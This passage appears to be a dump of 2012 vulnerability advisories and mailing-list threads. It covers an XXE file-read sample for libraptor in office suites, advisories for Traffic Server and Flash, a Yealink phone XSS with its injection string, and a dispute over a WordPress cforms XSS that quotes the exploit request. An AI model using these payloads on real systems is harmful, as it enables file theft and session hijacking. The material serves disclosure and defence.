indirect, incidental, consequential, loss of business profits or
special damages, even if Matta Consulting or its suppliers have been
advised of the possibility of such damages.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.12 (GNU/Linux)
iQEcBAEBCAAGBQJPfWvwAAoJEG6QUCsisixssyUH/3R6+ziOQBHR9UKiNXfCnGz6
aR6h7tribWMskEb2t6RXGoEB4BS2upnzIqHYz15VbaOCHA3Gs3oUYvvsaQunf+bu
taYuuDW4dHEoHnuTHrcLELmczRDmg0hAnyYaE1oizQikUgnSWJ1zeqTxdh6PH3vi
cXrduM7mBZl2dJpIEOCCDspqxAMkv+qostOBQwW3xlLDKE+eyD+DzwMzWBU9WRXQ
dT6X8tp2MQb4Ut5sp8NOeq5mQlCjFpEMp3XZtekEDofMd3vH0V+1QRwOOZ3an+u1
VOAOIN+1KzRuIPHAH0XUKz07OQOUhD1DGPqFl+Hajk2XO0zh5X7Y0uVQ9KLp8C0=
=rBjG
-----END PGP SIGNATURE-----"
10670,CVE-2012-0037: libraptor - XXE in RDF/XML File Interpretation (Multiple office products affected),,CVE-2012-0037,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
VSR Security Advisory
http://www.vsecurity.com/
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Advisory Name: libraptor - XXE in RDF/XML File Interpretation
Release Date: 2012-03-24
Applications: libraptor / librdf (versions 1.x and 2.x)
Also Affected: OpenOffice 3.x, LibreOffice 3.x, AbiWord, KOffice
Author: tmorgan {a} vsecurity * com
Vendor Status: Patches available; major downstream vendors
and operating system distributions notified
CVE Candidate: CVE-2012-0037
Reference: http://www.vsecurity.com/resources/advisory/20120324-1/
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Product Description
~-----------------~
""Raptor is a free software / Open Source C library that provides a set of
parsers and serializers that generate Resource Description Framework (RDF)
triples by parsing syntaxes or serialize the triples into a syntax. The
supported parsing syntaxes are RDF/XML, N-Quads, N-Triples, TRiG, Turtle, RSS
tag soup including all versions of RSS, Atom 1.0 and 0.3, GRDDL and
microformats for HTML, XHTML and XML and RDFa. The serializing syntaxes are
RDF/XML (regular, and abbreviated), Atom 1.0, GraphViz, JSON, N-Quads,
N-Triples, RSS 1.0 and XMP."" -- libraptor web site [1]
libraptor is a component of librdf[2] which is used by a variety of open source
software to interpret Resource Description Framework (RDF) [3] formats.
Vulnerability Overview
~--------------------~
In December 2011, VSR identified a vulnerability in multiple open source office
products (including OpenOffice, LibreOffice, KOffice, and AbiWord) due to unsafe
interpretation of XML files with custom entity declarations. Deeper analysis
revealed that the vulnerability was caused by acceptance of external entities by
the libraptor library, which is used by librdf and is in turn used by these
office products.
In the context of office applications, these vulnerabilities could allow for XML
External Entity (XXE) attacks resulting in file theft and a loss of user privacy
when opening potentially malicious ODF documents. For other applications which
depend on librdf or libraptor, potentially serious consequences could result
from accepting RDF/XML content from untrusted sources, though the impact may
vary widely depending on the context.
Vulnerability Details
~-------------------~
Open Document Format (ODF) files consist of a collection of several different
files stored in a ZIP archive. Included in this set is a ""manifest.rdf"" file
which is formatted according to the RDF/XML representation. The RDF format is
intended to be used for storing metadata associated with specific document
elements. The manifest.rdf file can reference secondary RDF files within the
ODF file as well as external document schemas.
The RDF file parser (librdf) used by the affected office products allows DTD
specifications within the RDF files themselves. In addition, the parser
interprets external entities which may reference arbitrary external files, HTTP
and FTP resources.
For instance, the following ""evil.rdf"" file was created within a valid ODF text
archive (.odt file) which was referenced by the internal manifest.rdf file:
<?xml version=""1.0"" encoding=""utf-8""?>
<!DOCTYPE rdf [
<!ENTITY file SYSTEM ""file:///c:/windows/win.ini"">
]>
<rdf:RDF xmlns:rdf=""http://www.w3.org/1999/02/22-rdf-syntax-ns#"">
<rdf:Description rdf:about=""content.xml#id1265690860"">
<ns0:comment
xmlns:ns0=""http://www.w3.org/2000/01/rdf-schema#"">&file;</ns0:comment>
</rdf:Description>
</rdf:RDF>
Upon opening the malicious .odt file in OpenOffice for Windows, the
c:windowswin.ini file was read and included in the document metadata. Upon
saving the document, this metadata was included literally in the resulting
evil.rdf file (within the .odt):
<?xml version=""1.0"" encoding=""utf-8""?>
<rdf:RDF xmlns:rdf=""http://www.w3.org/1999/02/22-rdf-syntax-ns#"">
<rdf:Description rdf:about=""content.xml#id1265690860"">
<ns1:comment xmlns:ns1=""http://www.w3.org/2000/01/rdf-schema#"">; for
16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
CMCDLLNAME32=mapi32.dll
CMC=1
MAPIX=1
MAPIXVER=1.0.0.1
OLEMessaging=1
</ns1:comment>
</rdf:Description>
</rdf:RDF>
The malicious XML entities could also include URLs to attacker-controlled
HTTP or FTP resources. This would allow an attacker to determine when a
document was opened, potentially resulting in reduced privacy. However, based
on current analysis of the affected office applications, the most serious attack
scenario is likely to be:
1. Attacker posts a malicious file on a web site or sends file to victim. The
file contains a form for the victim to fill out and return to the attacker.
2. Victim fills out the form, saves it, sends it back to the attacker.
3. Attacker is able to read the contents of any stolen files as embedded
metadata, simply by unzipping the returned file and reading the malicious RDF
component.
This attack clearly requires some significant user interaction. However, other
applications which rely on librdf/libraptor have not been analyzed. It is
plausible that the context of the external entity interpretation in other
software could allow for more serious automated file retrieval attacks.
Versions Affected
~---------------~
The 1.x and 2.x major versions of librdf are affected.
Thus far, all recent versions of open source office products appear to be
affected, since these products rely on librdf/raptor for the interpretation of
RDF files. This, in turn relies on libxml2 which supports external entity
interpretation by default. OpenOffice and LibreOffice include a modified copy of
librdf 1.x which was vulnerable at the time of testing. It is likely that all
previously release 3.x versions of OpenOffice and LibreOffice are vulnerable.
AbiWord and KOffice rely on a copy of librdf which is installed by the
underlying operating system.
Numerous other open source software packages depend on librdf or libraptor
(including ardour, libslv2, lv2file, morla, soprano, and numerous
language-specific wrappers), but it is not known if these are exploitable in any
realistic scenario.
Vendor Response
~-------------~
The following timeline provides an overview of communication with the primary
affected vendors:
2012-01-09 OpenOffice, LibreOffice, AbiWord, KOffice, and libraptor
maintainers were provided a draft advisory and test sample.
The OpenWall ""distros"" mailing list was also notified.
Apache OpenOffice Security team acknowledged notification.
libraptor developer confirmed flaw.
2012-01-10 CVE-2012-0037 assigned by Apache.
2012-02-02 Notified OpenWall ""distros"" mailing list again, due to previous
technical problems.
2012-02-04 libraptor developer provided patches to all notified parties.
2012-02-22 Extensive arguing between vendors about embargo/release date.
2012-03-06 More arguing about release date.
2012-03-14 Agreed upon release date established.
2012-03-22 Security updates and vendor advisories released.
2012-03-24 VSR advisory released.
Recommendation
~------------~
Users of most open source operating system distributions should update to the
latest librdf package as soon as possible, once a patched version is available
for their distribution. OpenOffice and LibreOffice packages should also be
upgraded, since these include a custom copy of the library.
Users of other operating systems who use LibreOffice or OpenOffice should
upgrade these packages to the latest release versions as soon as possible.
Developers of software which rely on librdf or libraptor should assess the risk
of XXE attacks on interpreted XML files and take appropriate actions to notify
their users based on how their software operates. VSR would be happy to assist
developers in these efforts on a case-by-case basis.
Common Vulnerabilities and Exposures (CVE) Information
~----------------------------------------------------~
The Common Vulnerabilities and Exposures (CVE) project has assigned
the number CVE-2012-0037 to this issue. This is a candidate for
inclusion in the CVE list (http://cve.mitre.org), which standardizes
names for security problems.
Acknowledgements
~--------------~
Thanks to Leper for help in preliminary testing.
Thanks to Jan iankko Lieskovsky, Daniel Veillard, Caolï¿½n McNamara, and Michael
Stahl for performing deeper analysis on the interaction between libraptor and
libxml2.
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
References:
1. http://librdf.org/raptor/
2. http://librdf.org/
3. http://www.w3.org/RDF/
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
This advisory is distributed for educational purposes only with the sincere
hope that it will help promote public safety. This advisory comes with
absolutely NO WARRANTY; not even the implied warranty of merchantability or
fitness for a particular purpose. Neither Virtual Security Research, LLC nor
the author accepts any liability for any direct, indirect, or consequential
loss or damage arising from use of, or reliance on, this information.
See the VSR disclosure policy for more information on our responsible
disclosure practices:
http://www.vsecurity.com/company/disclosure
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Copyright 2012 Virtual Security Research, LLC. All rights reserved.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.12 (GNU/Linux)
iD8DBQFPbfkKQ1RSUNR+T+gRAtqLAKCfiu/8wW49/Jtp9Q4+4VvRgXDvegCfcZZf
l3N1P2JkzSJNnVZAuUqwBbs=
=8Uwi
-----END PGP SIGNATURE-----"
10676,[ANNOUNCE] Apache Traffic Server releases for security incident CVE-2012-0256,,CVE-2012-0256,"Everyone,
Below is our announcement for the security issue reported to us from Codenomicon, via CERT-FI. All previous versions of Apache Traffic Server are vulnerable, and we urge users to upgrade to either v3.0.4 or v3.1.3 immediately. Both releases are available from our download site at
http://trafficserver.apache.org/downloads
In addition to fixing the CVE-2012-0256 issue, both releases include various other bug fixes. For more details on those fixes, please visit the download site above.
We like to thank everyone involved with reporting and working on this incident. The CERT-FI announcement will be made available soon at
https://www.cert.fi/en/reports/2012/vulnerability612884.html
Sincerely,
-- Leif, on behalf of the Apache Traffic Server community
CVE-2012-0256: Apache Traffic Server host header vulnerability
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected: All stable Apache Traffic Server versions released
before v3.0.4, as well as all development releases prior to v3.1.3.
Description: A request with a very large Host: header can cause the server
to crash. This is a heap allocation issue.
Mitigation: All v2.0.x and v3.0.x users should upgrade to v3.0.4. Users of
the current development releases, v3.1.x, should upgrade to v3.1.3.
Credit: This issue was discovered by the Codenomicon CROSS project, and
reported to Apache via CERT-FI."
10700,"VUPEN Security Research - Adobe Flash Player ""Matrix3D"" Remote Memory Corruption (CVE-2012-0768)",,CVE-2012-0768,"VUPEN Security Research - Adobe Flash Player ""Matrix3D"" Remote Memory Corruption (APSB12-05 / CVE-2012-0768)
Website : http://www.vupen.com/english/research.php
Twitter : http://twitter.com/vupen
I. BACKGROUND
---------------------
Adobe Flash Player is a cross-platform browser-based application runtime
that delivers uncompromised viewing of expressive applications, content,
and videos across screens and browsers. Flash Player delivers breakthrough web experiences to over 98% of Internet users.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Adobe Acrobat and Reader.
The vulnerability is caused by a memory corruption error within the
Matrix3D class when processing malformed 3D data within SWF files, which
could be exploited by attackers to potentially compromise a vulnerable
system or disclose memory information by tricking a user into visiting
a specially crafted web page.
III. AFFECTED PRODUCTS
---------------------------
Adobe Flash Player version 11.1.102.62 and prior
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth technical analysis of the vulnerability and a proof-of-concept
code are available through the VUPEN Binary Analysis & Exploits portal:
http://www.vupen.com/english/services/ba-index.php
VUPEN Binary Analysis & Exploits Service provides private exploits and
in-depth technical analysis of the most significant public vulnerabilities
based on disassembly, reverse engineering, protocol analysis, and code audit.
The service allows governments and major corporations to evaluate risks, and
protect infrastructures and assets against new threats. The service also
allows security vendors (IPS, IDS, AntiVirus) to supplement their internal
research efforts and quickly develop both vulnerability-based and
exploit-based signatures to proactively protect their customers from attacks
and emerging threats.
V. VUPEN Threat Protection Program
-----------------------------------
Governments and major corporations which are members of the VUPEN Threat
Protection Program (TPP) have been proactively alerted about the vulnerability
when it was discovered by VUPEN in advance of its public disclosure, and
have received a detailed attack detection guidance to protect national and
critical infrastructures against potential 0-day attacks exploiting this
vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Upgrade to Adobe Flash Player version 11.1.102.63.
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is the world leader in vulnerability research for defensive and
offensive cyber security. VUPEN solutions enable corporations and governments
to measure and manage risks, eliminate vulnerabilities before they can be
exploited, and protect critical infrastructures and assets against known and
unknown vulnerabilities.
VUPEN has been recognized as ""Company of the Year 2011 in the Vulnerability
Research Market"" by Frost & Sullivan.
VUPEN solutions include:
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program (TPP) :
http://www.vupen.com/english/services/tpp-index.php
IX. REFERENCES
----------------------
http://www.adobe.com/support/security/bulletins/apsb12-05.html
http://www.vupen.com/english/research.php
X. DISCLOSURE TIMELINE
-----------------------------
2012-01-27 - Vulnerability Discovered by VUPEN
2012-03-15 - Public disclosure"
10730,Yealink VOIP Phone Persistent Cross Site Scripting Vulnerability [CVE-2012-1417],,CVE-2012-1417,"==============================================================
Secur-I Research Group Security Advisory [ SV-2012-005]
==============================================================
Title: Yealink VOIP Phone Persistent Cross Site Scripting Vulnerability
Product: Yealink Easy VOIP Phone
Homepage: http://www.yealink.com/
Impact: Medium
Authentication: Required
CVE: CVE-2012-1417
Vulnerability ID: SV-2012-005
Found: 2012-02-21
Author: Narendra Shinde
Secur-I Research Group
http://securview.com/
===================================================
Vendor description:
---------------------------
Yealink is the professional designer and manufacturer of IP Phone and IP Video Phone for the world-wide broadband telephony market. For more than ten years, Yealink has focused on VoIP products characterized by high cost-performance, easy deployment and affordable price.
Source: http://www.yealink.com/index.php/Company/
Vulnerability Information:
-----------------------------------
1) Multiple Cross Site Scripting vulnerabilities
Vulnerability Information:
-------------------------------------
Class: Improper Neutralization of Input during Web Page Generation ('Cross-site Scripting') [CWE-79]
Impact: Insertion and Execution of malicious scripts in user browser
Remotely Exploitable: Yes
Authentication Required: Yes
User interaction Required : Yes
Vulnerability overview/description:
-------------------------------------------------
Yealink Easy Voip phone is prone to multiple cross-site scripting vulnerabilities as the user-supplied input received via certain parameters is not properly sanitized. This can be exploited by submitting specially crafted input to the affected software. Successful exploitation could allow the attacker to execute arbitrary script code within the user's browser session in the security context of the targeted site. The attacker could redirect user to malicious site, gain access to user's cookies (including authentication cookies), if any, associated with the targeted site, access recently submitted data by the target user via web forms, or take actions on the site masquerading as the target user.
Description:
While adding contact information on Contacts page , user input is not properly sanitized.
The ""name"" field in Local Phone book and Blacklist form is vulnerable to script injection attacks.
Exploitation:
- Login using normal user (Default is user:user)
- Visit Contacts page at http://x.x.x.x/cgi-bin/ConfigManApp.com?Id=9
- Insert ""><img src=0 onerror=alert(/xss/) />
Device use common contact page for normal user and Admin user.Therefore any malicious input from user account on Contact page direclty affects admin user.
Workaround:
------------------
- Filter all unnecessary special characters from user input
- Use character escaping and encoding
- For more details please refer:
https://www.owasp.org/index.php/Cross- Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet
Timeline:
---------
Vulnerability Found : 2012-02-21
Reported to Vendor : 2012-02-23
Response from vendor support : 2012-02-27 (Contact the distributor in area not the vendor)
Confidentiality: This e-mail and any attachments may be confidential and may also be privileged. If you are not an intended named recipient, please notify the sender immediately and do not disclose the contents to another person use it for any purpose, or store or copy the information in any medium."
10868,Re: Fwd: 0-DAY XSS of cforms II is now fixed after a year and four months (was Re: cforms WordPress Plugin Cross Site Scripting Vulnerability - CVE-2010-3977),,CVE-2010-3977,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Dear Kousuke,
First of all, let me clarify that the disclosure process has been
entirely coordinated by me, and thus, Wagner, Conviso and Check Point
have no responsibilities over any mistake I eventually made.
Anyway, just to clarify your points:
> First, you must have reported to the developer, but in what way?
I sent to the developer a complete advisory, including the exploit code.
> Confusing the XSS vulnerability with PHP code execution
> vulnerability is so funny. I can't help feeling that you told it
> sloppily.
I never confused the vulnerabilities. And I never said the bug was
patched... Maybe you should redirect this comment to Secunia instead?
> Second, why didn't you confirm the fix before publishing exploit?
I don't have any obligation in confirming a fix. Actually, the
developer reply was:
""No one else ever complained about this problem and we have millions
of users, so we are not fixing it""
Thus, I didn't even knew there was a fix at any point in time.
Probably you, for not having any information of what actually happened
and because you totally mixed Secunia advisory with ours decided to
send such email blaming us.
> And I'd like to ask ALL SECURITY RESEARCHERS (of course including
> Rodrigo and Wagner).
>
> For what do you research security? What is your ""security""? To
> protect people from threat? Or throw people into crisis? Do you
> recognize effects of your halfway job like this case?
We have a responsibility with the users. If the user is not aware
that a vulnerability exists and is ignored by the vendor, he will
never have the power to decide.
Informing and sharing information is the responsibility of the
researchers. I always coordinated vulnerabilities I disclose, but in
case the developer decides that millions of users never reported and
thus, the issue is not really a problem, I just go ahead and publish
so the users can decide what to do. This is an open-source project,
so any user that is security-aware could apply a patch themselves.
If you have further questions, I'm glad to help.
Best Regards,
Rodrigo.
On 2/17/12 3:37 AM, Wagner Elias wrote:
> FYI
> --------------------------------------------------------------------------------
>
>
Wagner Elias, SANS GIAC, CobiTc, ITILc
> CTO (Chief Technical Officer) +55 41 3095-3986 +55 11 8141-3256
> ------------ Blog: http://wagnerelias.com Twitter:
> http://www.twitter.com/welias Conviso Application Security -
> http://www.conviso.com.br
>
>
>
> ---------- Forwarded message ---------- From: *Kousuke Ebihara*
> <kousuke co3k org <mailto:kousuke co3k org>> Date: Fri, Feb 17,
> 2012 at 2:31 AM Subject: 0-DAY XSS of cforms II is now fixed after
> a year and four months (was Re: cforms WordPress Plugin Cross Site
> Scripting Vulnerability - CVE-2010-3977) To: Rodrigo Branco
> <rbranco checkpoint com <mailto:rbranco checkpoint com>> Cc:
> ""full-disclosure lists grok org uk
> <mailto:full-disclosure lists grok org uk>""
> <full-disclosure lists grok org uk
> <mailto:full-disclosure lists grok org uk>>,
> ""bugtraq securityfocus com <mailto:bugtraq securityfocus com>""
> <bugtraq securityfocus com <mailto:bugtraq securityfocus com>>,
> ""Wagner Elias (welias conviso com br
> <mailto:welias conviso com br>)"" <welias conviso com br
> <mailto:welias conviso com br>>
>
>
> I've reported the following XSS vulnerability in cforms II. This
> vulnerability has been fixed on February 14, 2012 by its
> developer.
>
> WordPress cformsII Plugin ""rs"" Cross-Site Scripting Vulnerability
> - Secunia.com http://secunia.com/advisories/47984/
>
> You might see this is a normal XSS vulnerability, but this isn't.
>
> Because EXPLOIT CODE IS PUBLISHED AS 0-DAY ON Oct 30, 2010 in this
> list!
>
> Are you puzzled?
>
> Actually, the above vulnerability is the same with CVE-2010-3977,
> is brought by Rodrigo Branco and Wagner Elias.
>
> Secunia has published the related advisory on Nov 1, 2010:
> http://secunia.com/advisories/42006. According to Secunia, this
> vulnerability is fixed in v11.6.1. v11.6.1 is released on Sep 22,
> 2010.
>
> So you might image the following story.
>
> 1. Rodrigo (or Wagner) reported this vulnerability to the
> developer 2. The developer released new version for fix the XSS 3.
> Rodrigo (and/or Wagner) confirmed that fix 4. Rodrigo reports this
> vulnerability to this list
>
> However, this is not truth. The developer of cforms didn't fix this
> XSS at this point.
>
> So what he has ""fixed""? See the following diff::
>
> --- cforms-v11.5/lib_ajax.php 2009-09-18 10:29:06.000000000
> +0900 +++ cforms-v11.6.1/lib_ajax.php 2010-09-22
> 07:41:54.000000000 +0900 @@ -627,16 +627,16 @@ ### always
> modified header (""Cache-Control: no-cache, must-revalidate""); ###
> HTTP/1.1 header (""Pragma: no-cache""); ###
> HTTP/1.0 - $func_name = $_GET[""rs""]; +
> $func_name = sajax_sanitize( $_GET[""rs""] ); if (!
> empty($_GET[""rsargs""])) - $args =
> $_GET[""rsargs""]; + $args =
> sajax_sanitize( $_GET[""rsargs""] ); else $args = array(); } else { -
> $func_name = $_POST[""rs""]; + $func_name =
> sajax_sanitize( $_POST[""rs""] ); if (! empty($_POST[""rsargs""])) -
> $args = $_POST[""rsargs""]; + $args =
> sajax_sanitize( $_POST[""rsargs""] ); else $args = array(); } @@
> -651,6 +651,14 @@ exit; }
>
> + ### sanitize + function sajax_sanitize($t) { + //$t
> = preg_replace('/s/', '', $t); + $t =
> str_replace('<php', '', $t); + $t = str_replace('<?', '',
> $t); + return $t; + } + ### javascript escape a value
> function sajax_esc($val) {
>
> WTF!? This looks like fix for PHP code execution vulnerability,
> but there are no such vulnerabilities!
>
> Hey, Rodrigo and Wagner, do YOU see the above as fix for XSS?
> Really?
>
> So, the XSS was not fixed in v11.6.1. Of course the exploit code
> that was posted by Rodrigo, was available in many site until
> February 14, 2012.
>
> XSS vulnerability in WordPress and its plugin is too dangerous
> because if attacker gets full privileges of admin user by that
> vulnerability, he can write and execute any PHP code by using theme
> editing feature (if the target file is writable).
>
> As you can see, Rodrigo has done is throwing every cforms users
> into crisis and nothing more.
>
> Since exploit code is published before fix, there should be
> attacker who focuses this vulnerability. If so, many sites may be
> attacked by this vulnerability even if the admin never failed to
> apply security fix.
>
>
> Rodrigo and Wagner, I have some questions to you.
>
> First, you must have reported to the developer, but in what way?
> Confusing the XSS vulnerability with PHP code execution
> vulnerability is so funny. I can't help feeling that you told it
> sloppily. Second, why didn't you confirm the fix before publishing
> exploit?
>
>
> And I'd like to ask ALL SECURITY RESEARCHERS (of course including
> Rodrigo and Wagner).
>
> For what do you research security? What is your ""security""? To
> protect people from threat? Or throw people into crisis? Do you
> recognize effects of your halfway job like this case?
>
> Please reconsider this.
>
>
> Thanks, Kousuke
>
> (10/10/31 0:13), Rodrigo Branco wrote:
>> Dear List,
>>
>> I'm writing on behalf of the Check Point Vulnerability Discovery
>> Team
> to publish the following vulnerability.
>>
>>
>>
>> Check Point Software Technologies - Vulnerability Discovery Team
>> (VDT) http://www.checkpoint.com/defense/
>>
>> cforms WordPress Plugin Cross Site Scripting Vulnerability
>> CVE-2010-3977
>>
>>
>> INTRODUCTION
>>
>> According to Delicious Days, ""cforms is a powerful and feature
>> rich
> form plugin for WordPress, offering convenient deployment of
> multiple Ajax
>> driven contact forms throughout your blog or even on the same
>> page.""
>>
>> This problem was confirmed in the following versions of the
>> cforms
> WordPress Plugin, other versions
>> maybe also affected.
>>
>> cforms v11.5
>>
>>
>> CVSS Scoring System
>>
>> The CVSS score is: 5.5 Base Score: 6.7 Temporal Score: 5.5 We
>> used the following values to calculate the scores: Base score is:
>> AV:N/AC:L/Au:N/C:C/I:C/A:N Temporal score is: E:F/RL:OF/RC:C
>>
>>
>> DETAILS
>>
>> A data array is created in lib_ajax.php using values from a form
>> field
> in a POST request. The parameters rs and rsargs are not validated
> and thus
>> it is possible to inject code.
>>
>> Request: http://<server>/wp-content/plugins/cforms/lib_ajax.php
>> POST /wp-content/plugins/cforms/lib_ajax.php HTTP/1.1 Host:
>> <server> User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X
>> 10.6; en-US; rv: 1.9.2.10) Gecko/20100914 Firefox/3.6.10 Accept:
>> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
>> Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate
>> Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Keep-Alive: 115
>> Connection: keep-alive Content-Type:
>> application/x-www-form-urlencoded; charset=UTF-8 Content-Length:
>> 219 Cookie:
>> wp-settings-1=m0%3Do%26m1%3Do%26m2%3Do%26m3%3Do%26m4%3Do%26m5%3Do
>>
>>
%26m6%3Do%26m7%3Do%26m8%3Do%26urlbutton%3Dnone%26editor%3Dtinymce
>> %26imgsize%3Dfull%26align%3Dcenter%26hidetb%3D1%26m9%3Dc%26m10%3Do
>>
>>
%26uploader%3D1%26m11%3Do; wp-settings-time-1=1285758765;
>> c o m m e n t _ a u t h o r _ 9 3 f 4 1 b a 0 b 1 6 f 3 4 6 7 6 f
>> 8 0
> 2 0 5 8 e 8 2 3 8 8 f 6 = t e s t ;
>> comment_author_email_93f41ba0b16f34676f802058e82388f6=rbranco_nospam
>>
>>
%40checkpoint.com <http://40checkpoint.com>
>> Pragma: no-cache Cache-Control: no-cache
>> rs=<script>alert(1)</script>&rst=&rsrnd=1287506634854&rsargs[]=1$#
>>
>>
$<script>alert(1)</script>$#$rbranco_nospam checkpoint com
> <mailto:rbranco_nospam checkpoint com>$#$http://
>> www.checkpoint.com
>> <http://www.checkpoint.com>$#$<script>alert(1)</script>
>>
>>
>>
>> CREDITS
>>
>> This vulnerability has been brought to our attention by Wagner
>> Elias
> from Conviso IT Security company (http://www.conviso.com.br) and
> researched internally by Rodrigo Rubira Branco from the Check
> Point Vulnerability Discovery Team (VDT).
>>
>>
>>
>>
>> Best Regards,
>>
>> Rodrigo.
>>
>> -- Rodrigo Rubira Branco Senior Security Researcher Vulnerability
>> Discovery Team (VDT) Check Point Software Technologies
>
>
> -- Kousuke Ebihara <kousuke co3k org <mailto:kousuke co3k org>>
> http://co3k.org/
>
-----BEGIN PGP SIGNATURE-----
Version: GnuPG/MacGPG2 v2.0.17 (Darwin)
Comment: GPGTools - http://gpgtools.org
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iEYEARECAAYFAk8+Ps8ACgkQRpuC3B/O3qEnkgCfYMaIGbYhBw0DtIbJP6Wcw1wl
mnsAnRJsPQm7jQlMgCx3PE1pNTYZtDYo
=3DaK
-----END PGP SIGNATURE-----"
10869,0-DAY XSS of cforms II is now fixed after a year and four months (was Re: cforms WordPress Plugin Cross Site Scripting Vulnerability - CVE-2010-3977),,CVE-2010-3977,"I've reported the following XSS vulnerability in cforms II. This vulnerability has been fixed on February 14, 2012 by its developer.
WordPress cformsII Plugin ""rs"" Cross-Site Scripting Vulnerability - Secunia.com
http://secunia.com/advisories/47984/
You might see this is a normal XSS vulnerability, but this isn't.
Because EXPLOIT CODE IS PUBLISHED AS 0-DAY ON Oct 30, 2010 in this list!
Are you puzzled?
Actually, the above vulnerability is the same with CVE-2010-3977, is brought by Rodrigo Branco and Wagner Elias.
Secunia has published the related advisory on Nov 1, 2010: http://secunia.com/advisories/42006. According to Secunia, this vulnerability is fixed in v11.6.1. v11.6.1 is released on Sep 22, 2010.
So you might image the following story.
1. Rodrigo (or Wagner) reported this vulnerability to the developer
2. The developer released new version for fix the XSS
3. Rodrigo (and/or Wagner) confirmed that fix
4. Rodrigo reports this vulnerability to this list
However, this is not truth. The developer of cforms didn't fix this XSS at this point.
So what he has ""fixed""? See the following diff::
--- cforms-v11.5/lib_ajax.php 2009-09-18 10:29:06.000000000 +0900
+++ cforms-v11.6.1/lib_ajax.php 2010-09-22 07:41:54.000000000 +0900
@@ -627,16 +627,16 @@
### always modified
header (""Cache-Control: no-cache, must-revalidate""); ### HTTP/1.1
header (""Pragma: no-cache""); ### HTTP/1.0
- $func_name = $_GET[""rs""];
+ $func_name = sajax_sanitize( $_GET[""rs""] );
if (! empty($_GET[""rsargs""]))
- $args = $_GET[""rsargs""];
+ $args = sajax_sanitize( $_GET[""rsargs""] );
else
$args = array();
}
else {
- $func_name = $_POST[""rs""];
+ $func_name = sajax_sanitize( $_POST[""rs""] );
if (! empty($_POST[""rsargs""]))
- $args = $_POST[""rsargs""];
+ $args = sajax_sanitize( $_POST[""rsargs""] );
else
$args = array();
}
@@ -651,6 +651,14 @@
exit;
}
+ ### sanitize
+ function sajax_sanitize($t) {
+ //$t = preg_replace('/s/', '', $t);
+ $t = str_replace('<php', '', $t);
+ $t = str_replace('<?', '', $t);
+ return $t;
+ }
+
### javascript escape a value
function sajax_esc($val)
{
WTF!? This looks like fix for PHP code execution vulnerability, but there are no such vulnerabilities!
Hey, Rodrigo and Wagner, do YOU see the above as fix for XSS? Really?
So, the XSS was not fixed in v11.6.1. Of course the exploit code that was posted by Rodrigo, was available in many site until February 14, 2012.
XSS vulnerability in WordPress and its plugin is too dangerous because if attacker gets full privileges of admin user by that vulnerability, he can write and execute any PHP code by using theme editing feature (if the target file is writable).
As you can see, Rodrigo has done is throwing every cforms users into crisis and nothing more.
Since exploit code is published before fix, there should be attacker who focuses this vulnerability. If so, many sites may be attacked by this vulnerability even if the admin never failed to apply security fix.
Rodrigo and Wagner, I have some questions to you.
First, you must have reported to the developer, but in what way? Confusing the XSS vulnerability with PHP code execution vulnerability is so funny. I can't help feeling that you told it sloppily.
Second, why didn't you confirm the fix before publishing exploit?
And I'd like to ask ALL SECURITY RESEARCHERS (of course including Rodrigo and Wagner).
For what do you research security? What is your ""security""? To protect people from threat? Or throw people into crisis? Do you recognize effects of your halfway job like this case?
Please reconsider this.
Thanks,
Kousuke
(10/10/31 0:13), Rodrigo Branco wrote:
> Dear List,
>
> I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
>
>
>
> Check Point Software Technologies - Vulnerability Discovery Team (VDT)
> http://www.checkpoint.com/defense/
>
> cforms WordPress Plugin Cross Site Scripting Vulnerability
> CVE-2010-3977
>
>
> INTRODUCTION
>
> According to Delicious Days, ""cforms is a powerful and feature rich form plugin for WordPress, offering convenient deployment of multiple Ajax
> driven contact forms throughout your blog or even on the same page.""
>
> This problem was confirmed in the following versions of the cforms WordPress Plugin, other versions
> maybe also affected.
>
> cforms v11.5
>
>
> CVSS Scoring System
>
> The CVSS score is: 5.5
> Base Score: 6.7
> Temporal Score: 5.5
> We used the following values to calculate the scores:
> Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:N
> Temporal score is: E:F/RL:OF/RC:C
>
>
> DETAILS
>
> A data array is created in lib_ajax.php using values from a form field in a POST request. The parameters rs and rsargs are not validated and thus
> it is possible to inject code.
>
> Request:
> http://<server>/wp-content/plugins/cforms/lib_ajax.php
> POST /wp-content/plugins/cforms/lib_ajax.php HTTP/1.1
> Host: <server>
> User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:
